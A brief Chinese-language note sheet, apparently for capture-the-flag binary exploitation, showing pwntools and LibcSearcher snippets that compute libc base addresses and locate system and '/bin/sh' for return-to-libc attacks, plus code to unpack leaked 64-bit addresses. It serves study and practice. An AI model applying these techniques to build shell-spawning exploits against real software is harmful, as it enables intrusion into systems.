# libc 处理方式

## 1 next + libc.search
设置 address
```py
libc = ELF('./libc.so')
libc.address = puts_addr - libc.sym["puts"]
system = libc.sym["system"]
bin_sh = next(libc.search(b"/bin/sh"))
ret = 0x00004004c9
```

未设置 address
```py
libc = ELF("./libc-2.23.so")
offset = puts_addr - libc.sym["puts"]
system = libc.sym["system"] + offset
bin_sh = libc.search(b'/bin/sh').__next__() + offset
# bin_sh = next(libc.search(b"/bin/sh")) + offset
```
## 2 libsearcher

```py
from LibcSearcher import *
libc = LibcSearcher('puts', puts_addr)

offset = puts_addr - libc.dump('puts')
system = offset + libc.dump('system')
bin_sh = offset + libc.dump('str_bin_sh')
```

## 3 手动查找

https://libc.blukat.me/ 查一下 puts 9c0  查后三位就行
手动设置
```py
system_addr = 0x04f440
puts = 0x0809c0
str_bin_sh = 0x1b3e9a
base = addr - puts
```

# pack unpack

## x64
```py
# -- 1 --
puts_addr = io.recvuntil(b'\x7f')[-6:]
puts_addr = unpack(puts_addr.ljust(8, b'\x00'))  # 地址是6bytes, 补到8位unpack

# -- 2 --
libc.address = u64(s.recvuntil('\x7f')[-6:] + b'\x00\x00') - libc.sym['atoi']
```
